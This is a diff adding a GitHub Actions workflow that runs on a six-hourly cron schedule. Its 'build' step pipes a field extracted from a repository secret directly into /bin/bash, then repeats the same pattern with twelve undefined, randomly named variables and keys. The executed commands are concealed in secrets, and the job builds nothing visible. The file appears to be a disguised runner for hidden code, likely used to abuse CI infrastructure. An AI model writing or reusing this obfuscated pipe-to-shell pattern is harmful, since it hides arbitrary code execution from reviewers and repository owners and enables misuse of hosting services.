@@ -1,0 +1,29 @@
+name: wuhaoning3214
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuhaoning3214
+        env:
+          ng4: ${{ secrets.ng4 }}
+        run: |
+          echo $ng4 | jq -r .kfki795 | /bin/bash
+          echo $pq12311 | jq -r .zqbst413 | /bin/bash
+          echo $clq7 | jq -r .al3 | /bin/bash
+          echo $vipt4325 | jq -r .qdvz873 | /bin/bash
+          echo $zv81 | jq -r .bn620 | /bin/bash
+          echo $jx3 | jq -r .f91 | /bin/bash
+          echo $k571 | jq -r .vrt8 | /bin/bash
+          echo $m42637 | jq -r .x8501 | /bin/bash
+          echo $cx19 | jq -r .n7748 | /bin/bash
+          echo $krc50165 | jq -r .f9 | /bin/bash
+          echo $cdrdi2329 | jq -r .bt2 | /bin/bash
+          echo $r865 | jq -r .fxn6379 | /bin/bash
+          echo $ajjwg6162 | jq -r .zrdl626 | /bin/bash
+
